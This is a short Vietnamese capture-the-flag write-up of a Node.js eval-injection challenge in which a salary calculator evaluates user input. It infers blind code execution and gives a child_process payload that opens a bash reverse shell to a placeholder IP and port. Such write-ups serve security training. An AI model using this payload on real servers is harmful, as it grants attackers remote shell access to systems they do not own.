# Node - Eval (Medium - 30 pts)

Ở challenge này chúng ta sẽ nhập vào tổng tiền lương, sau đó nhập vào các phí sinh hoạt chẳng hạn, sau đó chương trình sẽ thực hiện tính toán để show ra giá trị tiền còn lại (lấy lương trừ cho tiền phí sinh hoạt)

Quá rõ ràng bài này khai thác dựa trên hàm eval nên phép toán ở phía server có thể là:

```
eval("lương") - eval("phí sinh hoạt")...
```
Hoặc

```
eval("lương - phí sinh hoạt")
```

Mình sẽ sử dụng `process.cwd()` để xem directory hiện tại:

Kết quả nhận được sẽ là "NaN" có nghĩa là kết quả của trả về sẽ được xem là một dạng dữ liệu là number nhưng không xác định (vì process.cwd() cho kết quả dạng chuỗi string). Điều này chứng tỏ chúng ta không thể xem kết quả trực tiếp được.

Nhưng dù không xem được kết quả nhưng chúng ta đã biết được là câu lệnh mà chúng ta sử dụng đã hoạt động. 

Nên ý tưởng của mình là sẽ sử dụng reverse shell trong trường hợp này.

```
require("child_process").exec('bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"')
```

![image](https://user-images.githubusercontent.com/83667873/153466319-7f79f850-91a2-45ad-aa0d-2113027ce44e.png)
